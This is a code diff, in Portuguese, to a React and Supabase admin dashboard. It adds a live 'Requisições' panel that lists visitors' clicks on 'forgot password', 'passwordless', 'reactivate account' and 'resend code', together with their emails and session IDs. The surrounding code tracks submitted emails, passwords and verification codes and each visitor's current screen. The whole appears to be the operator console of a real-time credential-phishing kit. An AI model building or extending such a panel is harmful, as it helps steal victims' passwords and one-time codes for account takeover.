@@ -4,7 +4,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/contexts/AuthContext";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Activity, History, Radio, Monitor } from "lucide-react";
+import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Activity, History, Radio, Monitor, Bell, KeyRound as Key } from "lucide-react";
 import { EyeOfHorus } from "@/components/icons/EyeOfHorus";
 import { toast } from "sonner";
 import { ADMIN_BASE } from "@/lib/admin-route";
@@ -47,6 +47,23 @@ interface ActiveSession {
   user_agent: string | null;
   lastActivity: string;
 }
+
+interface RequestRow {
+  id: string;
+  ad_id: string;
+  session_id: string;
+  kind: string;
+  label: string;
+  email: string | null;
+  created_at: string;
+}
+
+const REQUEST_KIND_LABELS: Record<string, string> = {
+  "forgot-password": "Esqueci minha senha",
+  passwordless: "Entrar sem senha",
+  reactivate: "Quero ativar minha conta",
+  "email-code-resend": "Reenviar código",
+};
 
 const TRACKED = ["email_submitted", "password_submitted", "code_submitted"] as const;
 
@@ -131,6 +148,9 @@ export default function Dashboard() {
   const [liveScreens, setLiveScreens] = useState<Map<string, string>>(new Map());
   /** Última tela conhecida por sessão — persiste mesmo após a sessão ficar offline. */
   const [lastKnownScreens, setLastKnownScreens] = useState<Map<string, string>>(new Map());
+  /** Requisições do visitante (esqueci senha, sem senha, reativar, reenviar código). */
+  const [requests, setRequests] = useState<RequestRow[]>([]);
+  const [requestsPulse, setRequestsPulse] = useState(false);
 
   // Subscreve presença global de visitantes
   useEffect(() => {
@@ -229,6 +249,67 @@ export default function Dashboard() {
         "postgres_changes",
         { event: "INSERT", schema: "public", table: "ad_session_actions" },
         (payload) => setActions((prev) => [payload.new as ActionRow, ...prev]),
+      )
+      .subscribe();
+
+    return () => {
+      alive = false;
+      void ch.unsubscribe();
+    };
+  }, [user]);
+
+  // Carrega requisições (cliques em opções de ajuda) + realtime
+  useEffect(() => {
+    if (!user) return;
+    let alive = true;
+
+    type RawAction = {
+      id: string;
+      ad_id: string;
+      session_id: string;
+      action: string;
+      created_at: string;
+      payload: { kind?: string; label?: string; email?: string | null } | null;
+    };
+
+    const toRow = (r: RawAction): RequestRow | null => {
+      if (r.action !== "request") return null;
+      const kind = r.payload?.kind ?? "";
+      return {
+        id: r.id,
+        ad_id: r.ad_id,
+        session_id: r.session_id,
+        kind,
+        label: r.payload?.label ?? REQUEST_KIND_LABELS[kind] ?? kind,
+        email: r.payload?.email ?? null,
+        created_at: r.created_at,
+      };
+    };
+
+    supabase
+      .from("ad_session_actions")
+      .select("id, ad_id, session_id, action, created_at, payload")
+      .eq("action", "request")
+      .order("created_at", { ascending: false })
+      .limit(500)
+      .then(({ data }) => {
+        if (!alive) return;
+        const rows = ((data ?? []) as RawAction[]).map(toRow).filter(Boolean) as RequestRow[];
+        setRequests(rows);
+      });
+
+    const ch = supabase
+      .channel("dash-requests")
+      .on(
+        "postgres_changes",
+        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: "action=eq.request" },
+        (payload) => {
+          const row = toRow(payload.new as RawAction);
+          if (!row) return;
+          setRequests((prev) => [row, ...prev]);
+          setRequestsPulse(true);
+          setTimeout(() => setRequestsPulse(false), 600);
+        },
       )
       .subscribe();
 
@@ -487,6 +568,60 @@ export default function Dashboard() {
                       </tr>
                     );
                   })}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </section>
+
+        {/* REQUISIÇÕES */}
+        <section className={`mt-8 rounded-xl border bg-card shadow-card transition-shadow ${requestsPulse ? "border-primary shadow-glow" : "border-border"}`}>
+          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
+            <div className="flex items-center gap-2">
+              <Bell className={`h-4 w-4 text-primary ${requestsPulse ? "animate-pulse" : ""}`} />
+              <h2 className="font-display text-base font-semibold tracking-wider uppercase">Requisições</h2>
+              <Badge variant="secondary" className="text-[10px]">{requests.length}</Badge>
+            </div>
+          </div>
+
+          {requests.length === 0 ? (
+            <div className="flex flex-col items-center gap-3 px-6 py-10 text-center">
+              <p className="text-sm text-muted-foreground">
+                Quando alguém clicar em "esqueci a senha", "entrar sem senha", "ativar conta" ou "reenviar código", aparece aqui.
+              </p>
+            </div>
+          ) : (
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm">
+                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
+                  <tr>
+                    <th className="px-4 py-3 text-left font-medium">Quando</th>
+                    <th className="px-4 py-3 text-left font-medium">Requisição</th>
+                    <th className="px-4 py-3 text-left font-medium">
+                      <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
+                    </th>
+                    <th className="px-4 py-3 text-left font-medium">Sessão</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {requests.slice(0, 100).map((r) => (
+                    <tr key={r.id} className="border-t border-border hover:bg-muted/30">
+                      <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
+                        {formatTime(r.created_at)}
+                      </td>
+                      <td className="whitespace-nowrap px-4 py-3 text-xs">
+                        <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                          {r.label}
+                        </span>
+                      </td>
+                      <td className="break-all px-4 py-3 font-mono text-xs">
+                        <CopyText value={r.email || ""} />
+                      </td>
+                      <td className="whitespace-nowrap px-4 py-3 font-mono text-[10px] text-muted-foreground">
+                        {r.session_id.slice(0, 8)}…
+                      </td>
+                    </tr>
+                  ))}
                 </tbody>
               </table>
             </div>
